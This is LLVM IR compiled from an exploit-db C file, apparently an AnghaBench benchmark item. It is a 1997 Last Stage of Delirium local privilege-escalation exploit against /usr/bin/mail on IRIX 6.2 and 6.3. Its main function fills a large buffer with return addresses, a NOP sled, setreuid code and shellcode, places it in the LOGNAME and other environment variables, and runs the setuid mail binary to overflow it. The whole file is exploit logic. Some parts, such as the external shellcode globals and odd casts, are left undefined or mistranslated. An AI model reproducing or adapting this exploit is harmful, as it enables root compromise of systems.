; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_20138.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_20138.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM sep 1997 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [54 x i8] c"/usr/bin/mail for irix 6.2 6.3 IP:17,19,20,21,22,32\0A\0A\00", align 1
@jump = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [5 x i8] c"xxx=\00", align 1
@ADRNUM = common dso_local global i32 0, align 4
@TMPNUM = common dso_local global i32 0, align 4
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@setreuidcode = common dso_local global i8** null, align 8
@shellcode = common dso_local global i8** null, align 8
@.str.3 = private unnamed_addr constant [9 x i8] c"LOGNAME=\00", align 1
@ALLIGN = common dso_local global i32 0, align 4
@PCHNUM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [14 x i8] c"/usr/bin/mail\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [10000 x i8], align 16
  %7 = alloca [4 x i8], align 1
  %8 = alloca [4 x i8], align 1
  %9 = alloca [4 x i8], align 1
  %10 = alloca i8*, align 8
  %11 = alloca [3 x i8*], align 16
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = call i32 @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.1, i64 0, i64 0))
  %15 = load i64, i64* @jump, align 8
  %16 = inttoptr i64 %15 to i64 (...)*
  %17 = call i64 (...) %16()
  %18 = add i64 %17, 10264
  %19 = add i64 %18, 2500
  %20 = add i64 %19, 228
  %21 = add i64 %20, 228
  %22 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 %21, i64* %23, align 1
  %24 = load i64, i64* @jump, align 8
  %25 = inttoptr i64 %24 to i64 (...)*
  %26 = call i64 (...) %25()
  %27 = add i64 %26, 10264
  %28 = add i64 %27, 112
  %29 = add i64 %28, 32356
  %30 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %31 = bitcast i8* %30 to i64*
  store i64 %29, i64* %31, align 1
  %32 = load i64, i64* @jump, align 8
  %33 = inttoptr i64 %32 to i64 (...)*
  %34 = call i64 (...) %33()
  %35 = add i64 %34, 10264
  %36 = add i64 %35, 7000
  %37 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %38 = bitcast i8* %37 to i64*
  store i64 %36, i64* %38, align 1
  %39 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %40 = getelementptr inbounds [3 x i8*], [3 x i8*]* %11, i64 0, i64 0
  store i8* %39, i8** %40, align 16
  %41 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 8000
  %42 = getelementptr inbounds [3 x i8*], [3 x i8*]* %11, i64 0, i64 1
  store i8* %41, i8** %42, align 8
  %43 = getelementptr inbounds [3 x i8*], [3 x i8*]* %11, i64 0, i64 2
  store i8* null, i8** %43, align 16
  %44 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  store i8* %44, i8** %10, align 8
  %45 = load i8*, i8** %10, align 8
  %46 = call i32 @sprintf(i8* %45, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  %47 = load i8*, i8** %10, align 8
  %48 = getelementptr inbounds i8, i8* %47, i64 4
  store i8* %48, i8** %10, align 8
  store i32 0, i32* %12, align 4
  br label %49

49:                                               ; preds = %61, %2
  %50 = load i32, i32* %12, align 4
  %51 = load i32, i32* @ADRNUM, align 4
  %52 = icmp slt i32 %50, %51
  br i1 %52, label %53, label %64

53:                                               ; preds = %49
  %54 = load i32, i32* %12, align 4
  %55 = srem i32 %54, 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = load i8*, i8** %10, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %10, align 8
  store i8 %58, i8* %59, align 1
  br label %61

61:                                               ; preds = %53
  %62 = load i32, i32* %12, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %12, align 4
  br label %49

64:                                               ; preds = %49
  store i32 0, i32* %12, align 4
  br label %65

65:                                               ; preds = %77, %64
  %66 = load i32, i32* %12, align 4
  %67 = load i32, i32* @TMPNUM, align 4
  %68 = icmp slt i32 %66, %67
  br i1 %68, label %69, label %80

69:                                               ; preds = %65
  %70 = load i32, i32* %12, align 4
  %71 = srem i32 %70, 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 %72
  %74 = load i8, i8* %73, align 1
  %75 = load i8*, i8** %10, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 1
  store i8* %76, i8** %10, align 8
  store i8 %74, i8* %75, align 1
  br label %77

77:                                               ; preds = %69
  %78 = load i32, i32* %12, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %12, align 4
  br label %65

80:                                               ; preds = %65
  store i32 0, i32* %12, align 4
  br label %81

81:                                               ; preds = %95, %80
  %82 = load i32, i32* %12, align 4
  %83 = load i32, i32* @NOPNUM, align 4
  %84 = icmp slt i32 %82, %83
  br i1 %84, label %85, label %98

85:                                               ; preds = %81
  %86 = load i32*, i32** @nop, align 8
  %87 = load i32, i32* %12, align 4
  %88 = srem i32 %87, 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i32, i32* %86, i64 %89
  %91 = load i32, i32* %90, align 4
  %92 = trunc i32 %91 to i8
  %93 = load i8*, i8** %10, align 8
  %94 = getelementptr inbounds i8, i8* %93, i32 1
  store i8* %94, i8** %10, align 8
  store i8 %92, i8* %93, align 1
  br label %95

95:                                               ; preds = %85
  %96 = load i32, i32* %12, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %12, align 4
  br label %81

98:                                               ; preds = %81
  store i32 0, i32* %12, align 4
  br label %99

99:                                               ; preds = %113, %98
  %100 = load i32, i32* %12, align 4
  %101 = load i8**, i8*** @setreuidcode, align 8
  %102 = call i32 @strlen(i8** %101)
  %103 = icmp slt i32 %100, %102
  br i1 %103, label %104, label %116

104:                                              ; preds = %99
  %105 = load i8**, i8*** @setreuidcode, align 8
  %106 = load i32, i32* %12, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8*, i8** %105, i64 %107
  %109 = load i8*, i8** %108, align 8
  %110 = ptrtoint i8* %109 to i8
  %111 = load i8*, i8** %10, align 8
  %112 = getelementptr inbounds i8, i8* %111, i32 1
  store i8* %112, i8** %10, align 8
  store i8 %110, i8* %111, align 1
  br label %113

113:                                              ; preds = %104
  %114 = load i32, i32* %12, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %12, align 4
  br label %99

116:                                              ; preds = %99
  store i32 0, i32* %12, align 4
  br label %117

117:                                              ; preds = %131, %116
  %118 = load i32, i32* %12, align 4
  %119 = load i8**, i8*** @shellcode, align 8
  %120 = call i32 @strlen(i8** %119)
  %121 = icmp slt i32 %118, %120
  br i1 %121, label %122, label %134

122:                                              ; preds = %117
  %123 = load i8**, i8*** @shellcode, align 8
  %124 = load i32, i32* %12, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8*, i8** %123, i64 %125
  %127 = load i8*, i8** %126, align 8
  %128 = ptrtoint i8* %127 to i8
  %129 = load i8*, i8** %10, align 8
  %130 = getelementptr inbounds i8, i8* %129, i32 1
  store i8* %130, i8** %10, align 8
  store i8 %128, i8* %129, align 1
  br label %131

131:                                              ; preds = %122
  %132 = load i32, i32* %12, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %12, align 4
  br label %117

134:                                              ; preds = %117
  %135 = load i8*, i8** %10, align 8
  store i8 0, i8* %135, align 1
  %136 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 8000
  store i8* %136, i8** %10, align 8
  %137 = load i8*, i8** %10, align 8
  %138 = call i32 @sprintf(i8* %137, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0))
  %139 = load i8*, i8** %10, align 8
  %140 = getelementptr inbounds i8, i8* %139, i64 8
  store i8* %140, i8** %10, align 8
  store i32 0, i32* %12, align 4
  br label %141

141:                                              ; preds = %148, %134
  %142 = load i32, i32* %12, align 4
  %143 = load i32, i32* @ALLIGN, align 4
  %144 = icmp slt i32 %142, %143
  br i1 %144, label %145, label %151

145:                                              ; preds = %141
  %146 = load i8*, i8** %10, align 8
  %147 = getelementptr inbounds i8, i8* %146, i32 1
  store i8* %147, i8** %10, align 8
  store i8 -1, i8* %146, align 1
  br label %148

148:                                              ; preds = %145
  %149 = load i32, i32* %12, align 4
  %150 = add nsw i32 %149, 1
  store i32 %150, i32* %12, align 4
  br label %141

151:                                              ; preds = %141
  store i32 0, i32* %12, align 4
  br label %152

152:                                              ; preds = %164, %151
  %153 = load i32, i32* %12, align 4
  %154 = load i32, i32* @PCHNUM, align 4
  %155 = icmp slt i32 %153, %154
  br i1 %155, label %156, label %167

156:                                              ; preds = %152
  %157 = load i32, i32* %12, align 4
  %158 = srem i32 %157, 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 %159
  %161 = load i8, i8* %160, align 1
  %162 = load i8*, i8** %10, align 8
  %163 = getelementptr inbounds i8, i8* %162, i32 1
  store i8* %163, i8** %10, align 8
  store i8 %161, i8* %162, align 1
  br label %164

164:                                              ; preds = %156
  %165 = load i32, i32* %12, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %12, align 4
  br label %152

167:                                              ; preds = %152
  %168 = load i8*, i8** %10, align 8
  store i8 0, i8* %168, align 1
  %169 = getelementptr inbounds [3 x i8*], [3 x i8*]* %11, i64 0, i64 0
  %170 = call i32 @execle(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0), i32 0, i8** %169)
  %171 = load i32, i32* %3, align 4
  ret i32 %171
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @strlen(i8**) #1

declare dso_local i32 @execle(i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
